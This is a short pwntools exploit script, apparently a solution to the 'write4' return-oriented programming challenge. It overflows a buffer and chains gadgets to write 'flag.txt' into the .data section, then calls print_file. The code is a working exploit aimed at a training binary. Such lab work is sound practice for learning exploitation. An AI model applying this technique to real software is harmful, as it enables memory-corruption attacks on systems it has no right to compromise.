#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./write4')
context.terminal = ["/usr/bin/konsole", "-e", "sh", "-c"]

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

DATA_SECTION = 0x601028 # .data has 0x10 bytes available but i only need 9 bytes
RET = 0x4004e6 # ret
POPRDI_RET = 0x400693 # pop rdi ; ret
MOVR14R15_RET = 0x400628 # mov qword ptr [r14], r15 ; ret
POPR14R15_RET = 0x400690 # pop r14 ; pop r15 ; ret
PRINT_FILE = 0x400510 # print_file@plt

io = start()

attack = b"A"*0x28
attack += p64(POPR14R15_RET) + p64(DATA_SECTION) + b"flag.txt"
attack += p64(MOVR14R15_RET)
attack += p64(POPR14R15_RET) + p64(DATA_SECTION+8) + b"\x00"*8 # Null-terminated String
attack += p64(MOVR14R15_RET)
attack += p64(POPRDI_RET) + p64(DATA_SECTION) + p64(RET) + p64(PRINT_FILE)
print(attack)
print(len(attack))
io.sendline(attack)

io.interactive()
